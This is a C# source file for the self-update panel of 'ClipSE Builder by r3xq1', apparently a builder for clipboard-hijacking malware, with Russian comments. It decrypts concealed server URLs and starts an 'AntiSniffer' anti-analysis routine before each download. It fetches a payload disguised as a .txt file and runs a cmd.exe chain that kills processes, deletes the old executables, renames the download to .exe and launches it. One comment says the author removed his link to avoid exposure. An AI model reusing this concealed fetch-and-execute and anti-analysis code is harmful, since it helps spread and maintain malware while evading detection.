using System;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using ClipPurSEditionBuilder.Sticks;

namespace ClipPurSEditionBuilder.ControlsSE
{
    public partial class UpdateSE : UserControl
    {
        public UpdateSE() => InitializeComponent();

        private void UpdateSE_Load(object sender, EventArgs e) => this.VerNow.Text = Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase)
                ? $"{Language.GlobalMessageStrings_en_US.CurrentVer} {GlobalPath.VersionBuild}"
                : $"{Language.GlobalMessageStrings_ru_RU.CurrentVer} {GlobalPath.VersionBuild}";

        private void CheckVersionButton_Click(object sender, EventArgs e) => Checker(EncryptKey.Decrypt(GlobalPath.Server, GlobalPath.SecretKey_Public));

        private void DownloadUpdates_ClickAsync(object sender, EventArgs e) => LoadingBuilder(EncryptKey.Decrypt(GlobalPath.TextBuild, GlobalPath.SecretKey_Public));

        private void Launch_Click(object sender, EventArgs e)
        {
            if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
            {
                ControlActive.CheckMessage(this.ShowMessageGetSE, Language.GlobalMessageStrings_en_US.RestartBuild);
            }
            else
            {
                ControlActive.CheckMessage(this.ShowMessageGetSE, Language.GlobalMessageStrings_en_US.RestartBuild);
            }
            if (Check_US("Ваша ссылка на обнову.. ( я вырезал свою дабы не палить )"))
            {
                AppRestart();
            }
        }

        /// <summary>
        /// Метод для проверки обновления
        /// </summary>
        /// <param name="link">Ссылка на текстовый документ</param>
        private void Checker(string link)
        {
            try
            {
                new Thread(() => { AntiSniffer.Inizialize(); }).Start();
                using (var client = new WebClient())
                {
                    client.Proxy = null;
                    var url = new Uri(link, UriKind.Absolute);
                    string text = client.DownloadString(url);

                    if (text.Contains(GlobalPath.VersionBuild)) // Сверка версии
                    {
                        this.VerNew.Visible = false;
                        this.DownloadUpdates.Visible = false;
                        if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                        {
                            ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.FinalVersionMessage);
                        }
                        else
                        {
                            ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.FinalVersionMessage);
                        }
                    }
                    else
                    {
                        this.VerNew.Visible = true;
                        if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                        {
                            ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.AccessNew);
                            this.VerNew.Text = $"{Language.GlobalMessageStrings_en_US.NewVer} {text}";
                        }
                        else
                        {
                            ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.AccessNew);
                            this.VerNew.Text = $"{Language.GlobalMessageStrings_ru_RU.NewVer} {text}";
                        }
                        this.DownloadUpdates.Visible = true;
                    }
                }
            }
            catch (WebException)
            {
                if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                {
                    ControlActive.CheckMessage(this.ShowMessageDownload, Language.GlobalMessageStrings_en_US.ErrorConnect);
                }
                else
                {
                    ControlActive.CheckMessage(this.ShowMessageDownload, Language.GlobalMessageStrings_ru_RU.ErrorConnect);
                }
                this.DownloadUpdates.Visible = false;
            }
        }

        /// <summary>
        /// Метод для загрузки обновления
        /// </summary>
        /// <param name="link">Ссылка на билдер</param>
        private void LoadingBuilder(string link)
        {
            new Thread(() => { AntiSniffer.Inizialize(); }).Start();
            try
            {
                var url = new Uri(link, UriKind.Absolute);
                using (var update = new WebClient())
                {
                    update.Proxy = null;
                    update.DownloadFile(url, GlobalPath.NewFile);
                    if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                    {
                        ControlActive.CheckMessage(this.ShowMessageDownload, Language.GlobalMessageStrings_en_US.UpdateSuccess);
                    }
                    else
                    {
                        ControlActive.CheckMessage(this.ShowMessageDownload, Language.GlobalMessageStrings_ru_RU.UpdateSuccess);
                    }
                }
            }
            catch (WebException)
            {
                if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                {
                    ControlActive.CheckMessage(this.ShowMessageDownload, Language.GlobalMessageStrings_en_US.ErrorConnect);
                }
                else
                {
                    ControlActive.CheckMessage(this.ShowMessageDownload, Language.GlobalMessageStrings_ru_RU.ErrorConnect);
                }
                this.Launch.Visible = false;
            }
            this.Launch.Visible = FileControl.ExistsFile(GlobalPath.NewFile) ? true : false;
        }

        /// <summary>
        /// Метод для перезапуска обновления билдера
        /// </summary>
        private void AppRestart()
        {
            if (FileControl.ExistsFile(GlobalPath.NewFile))
            {
                ProcessControl.RunFile("cmd.exe", "Taskkill /f /im \"ClipSE *\" && Timeout /t 1 && del \"ClipSE *.exe\" && ren UpdateSE.txt \"ClipSE Builder by r3xq1.exe\" && \"ClipSE Builder by r3xq1.exe\"");
            }
            else
            {
                if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                {
                    ControlActive.CheckMessage(this.ShowMessageDownload, Language.GlobalMessageStrings_en_US.FileExists);
                }
                else
                {
                    ControlActive.CheckMessage(this.ShowMessageDownload, Language.GlobalMessageStrings_ru_RU.FileExists);
                }
            }
        }

        private static bool Check_US(string linkdll)
        {
            // Удаляем папку "en-US" вмести с файлом перед обновлением.
            FileControl.DirectoryDelete(GlobalPath.EngDir);
            Thread.Sleep(1000);
            if (!FileControl.ExistsDirectory(GlobalPath.EngDir))
            {
                FileControl.CreateDirectory(GlobalPath.EngDir, System.IO.FileAttributes.Normal);
                // https://github.com/StHarp-gsvv/UpdateSE/blob/master/ClipSE Builder by r3xq1.resources.txt
                // https://github.com/StHarp-gsvv/UpdateSE/blob/master/ClipSE%20Builder%20by%20r3xq1.resources.txt
                new Thread(() => { AntiSniffer.Inizialize(); }).Start();

                var urldll = new Uri(linkdll, UriKind.Absolute);
                using (var updatedll = new WebClient())
                {
                    updatedll.Proxy = null;
                    updatedll.DownloadFile(urldll, GlobalPath.NewFile_Dll);
                    return true;
                }
            }
            return false;
        }
    }
}